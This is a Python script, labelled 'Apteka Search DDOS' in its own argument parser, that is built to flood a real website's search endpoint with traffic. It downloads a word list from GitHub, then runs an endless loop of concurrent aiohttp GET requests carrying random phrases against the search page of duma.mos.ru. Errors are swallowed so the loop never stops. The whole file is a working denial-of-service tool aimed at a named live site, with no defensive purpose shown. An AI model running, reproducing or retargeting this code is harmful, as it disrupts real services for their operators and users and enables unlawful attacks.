import aiohttp
import asyncio
import time
import csv
import wget
import random
import argparse


parser = argparse.ArgumentParser(description="Apteka Search DDOS")
parser.add_argument("-t", dest="tasks", required=True, type=int)
args = parser.parse_args()


def csv_to_list(file):
    l = []
    with open(file) as csv_file:
        csv_reader = csv.reader(csv_file, delimiter=',')
        line_count = 0
        for row in csv_reader:
            if line_count != 0:
                l.append(row[0].replace(' ', ''))
            line_count += 1
    return l

phrases_raw = 'https://raw.githubusercontent.com/balazszoli/KiberTerOborona-stat/main/word.csv'
phrases_csv = wget.download(phrases_raw)
phrases = csv_to_list(phrases_csv)


async def search_mosduma(session, phrase):
    url = f'https://duma.mos.ru/ru/search?q={phrase}&fields[]=name,content&date[from]=01.01.1980&date[to]=31.12.2222&sort=date-asc&search=1'
    async with session.get(url) as resp:
        mosduma = await resp.text()
        print(url)
        return mosduma


async def main():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(1, args.tasks):
            tasks.append(asyncio.ensure_future(search_mosduma(session, random.choice(phrases))))
        respo = await asyncio.gather(*tasks)


while True:
    try:
        asyncio.run(main())
    except Exception as e:
        print(f'Exception: {e}')
